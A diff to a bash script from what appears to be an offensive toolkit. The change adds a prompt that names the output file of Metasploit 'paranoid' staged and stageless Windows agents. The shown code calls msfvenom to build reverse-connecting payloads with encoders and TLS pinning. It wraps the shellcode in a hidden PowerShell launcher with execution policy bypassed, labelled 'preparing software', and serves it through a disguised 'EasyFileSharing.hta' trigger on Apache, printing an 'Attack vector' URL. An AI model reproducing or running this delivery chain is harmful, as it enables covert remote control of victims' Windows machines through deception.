@@ -48,6 +48,7 @@ PoSt=`cat $IPATH/settings | egrep -m 1 "POST_MODULE" | cut -d '=' -f2` > /dev/nu
 VaL=`cat $IPATH/settings | egrep -m 1 "ENABLE_UNICODE_ENCODING" | cut -d '=' -f2` > /dev/null 2>&1 # enable unicode encoding?
 StAgE=`cat $IPATH/settings | egrep -m 1 "ENABLE_STAGE_ENCODING" | cut -d '=' -f2` > /dev/null 2>&1 # enable stage encoding?
 HtA=`cat $IPATH/settings | egrep -m 1 "HTA_ATTACK_VECTOR" | cut -d '=' -f2` > /dev/null 2>&1 # Use hta attack vector to deliver agent?
+OuT=`cat $IPATH/settings | egrep -m 1 "INPUT_AGENT_NAME" | cut -d '=' -f2` > /dev/null 2>&1 # Agent output name (user interaction)
 
 
 
@@ -305,6 +306,14 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   echo ${BlueF}[☠]${white} staged payload sellected ..${Reset};
   sleep 1
     #
+    # Output agent name (settings file conf)..
+    #
+    if [ "$OuT" = "ON" ]; then
+      AgEnT=$(zenity --title="☠ Input Agent name ☠" --text "example: paranoid-staged" --entry --width 270) > /dev/null 2>&1
+    else
+      AgEnT="paranoid-staged"
+    fi
+    #
     # Create a Paranoid Payload (staged payload)
     # For this use case, we will combine Payload UUID tracking with TLS pinning.
     #
@@ -324,7 +333,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
      else
        format="psh-cmd"
      fi
-    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f $format -o paranoid-staged.$DEFAULT_EXT
+    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f $format -o $AgEnT.$DEFAULT_EXT
 
       #
       # head (shellcode) - paranoid-staged.bat
@@ -332,8 +341,8 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
       if [ "$DEFAULT_EXT" = "exe" ]; then
         echo "No template required" > /dev/null 2>&1
       else
-        str0=`cat $IPATH/output/paranoid-staged.$DEFAULT_EXT | awk {'print $12'}`
-        rm $IPATH/output/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
+        str0=`cat $IPATH/output/$AgEnT.$DEFAULT_EXT | awk {'print $12'}`
+        rm $IPATH/output/$AgEnT.$DEFAULT_EXT > /dev/null 2>&1
       fi
       echo ${BlueF}[☠]${white} Building template ..${Reset};
       sleep 2
@@ -347,14 +356,14 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
           echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/template
           echo "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -Exec Bypass -noni -enc $str0" >> $IPATH/output/template
           echo "exit" >> $IPATH/output/template
-          mv -f template paranoid-staged.$DEFAULT_EXT
+          mv -f template $AgEnT.$DEFAULT_EXT
           # no template required ..
         elif [ "$DEFAULT_EXT" = "exe" ]; then
           echo "No template required" > /dev/null 2>&1
         else
           # build template ( ps1 | txt )
           echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $str0" > $IPATH/output/template
-          mv -f template paranoid-staged.$DEFAULT_EXT
+          mv -f template $AgEnT.$DEFAULT_EXT
         fi
 
     #
@@ -372,23 +381,23 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
           echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
           sleep 2
           sed "s|LhOsT|$LhOsT|" EasyFileSharing2.hta > trigger.hta
-          sed -i "s|NaMe|paranoid-staged.$DEFAULT_EXT|g" trigger.hta
+          sed -i "s|NaMe|$AgEnT.$DEFAULT_EXT|g" trigger.hta
           mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
-          cp $IPATH/output/paranoid-staged.$DEFAULT_EXT $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
+          cp $IPATH/output/$AgEnT.$DEFAULT_EXT $ApAcHe/$AgEnT.$DEFAULT_EXT > /dev/null 2>&1
         else
           echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
           sleep 2
           sed "s|LhOsT|$LhOsT|" EasyFileSharing.hta > trigger.hta
-          sed -i "s|NaMe|paranoid-staged.$DEFAULT_EXT|" trigger.hta
+          sed -i "s|NaMe|$AgEnT.$DEFAULT_EXT|" trigger.hta
           mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
-          cp $IPATH/output/paranoid-staged.$DEFAULT_EXT $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
+          cp $IPATH/output/$AgEnT.$DEFAULT_EXT $ApAcHe/$AgEnT.$DEFAULT_EXT > /dev/null 2>&1
         fi
       #
       # Start apache2 service ..
       #
       /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
       # Present URL (attack vector) to user
-      echo ${BlueF}"Attack vector: http://$LhOsT/EasyFileSharing.hta" ${Reset};
+      echo ${YellowF}[▶] Attack vector:${BlueF}" http://$LhOsT/EasyFileSharing.hta" ${Reset};
       sleep 2
       cd $IPATH
     fi
@@ -408,7 +417,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   #
   # Cleaning files & stop apache2 ..
   #
-  rm $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
+  rm $ApAcHe/$AgEnT.$DEFAULT_EXT > /dev/null 2>&1
   rm $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
   /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   sleep 2
@@ -422,6 +431,14 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
 elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
   echo ${BlueF}[☠]${white} stageless payload sellected ..${Reset};
   sleep 1
+    #
+    # Output agent name (settings file conf)..
+    #
+    if [ "$OuT" = "ON" ]; then
+      AgEnT=$(zenity --title="☠ Input Agent name ☠" --text "example: paranoid-stageless" --entry --width 270) > /dev/null 2>&1
+    else
+      AgEnT="paranoid-stageless"
+    fi
     #
     # Chose payload to use Building a stageless agent ..
     #
@@ -439,7 +456,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
      else
        ArCh="x86"
      fi
-    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f exe -o paranoid-stageless.exe
+    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f exe -o $AgEnT.exe
     sleep 2
 
     #
@@ -455,15 +472,15 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
         echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
         sleep 2
         sed "s|LhOsT|$LhOsT|" EasyFileSharing2.hta > trigger.hta
-        sed -i "s|NaMe|paranoid-staged.exe|g" trigger.hta
+        sed -i "s|NaMe|$AgEnT.exe|g" trigger.hta
         mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
-        cp $IPATH/output/paranoid-staged.exe $ApAcHe/paranoid-staged.exe > /dev/null 2>&1
+        cp $IPATH/output/$AgEnT.exe $ApAcHe/$AgEnT.exe > /dev/null 2>&1
       #
       # Start apache2 service ..
       #
       /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
       # Present URL (attack vector) to user
-      echo ${BlueF}"Attack vector: http://$LhOsT/EasyFileSharing.hta" ${Reset};
+      echo ${YellowF}[▶] Attack vector:${BlueF}" http://$LhOsT/EasyFileSharing.hta" ${Reset};
       sleep 2
       cd $IPATH
     fi
@@ -484,7 +501,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
   #
   # Cleaning files & stop apache2 ..
   #
-  rm $ApAcHe/paranoid-staged.exe > /dev/null 2>&1
+  rm $ApAcHe/$AgEnT.exe > /dev/null 2>&1
   rm $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
   /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   sleep 2
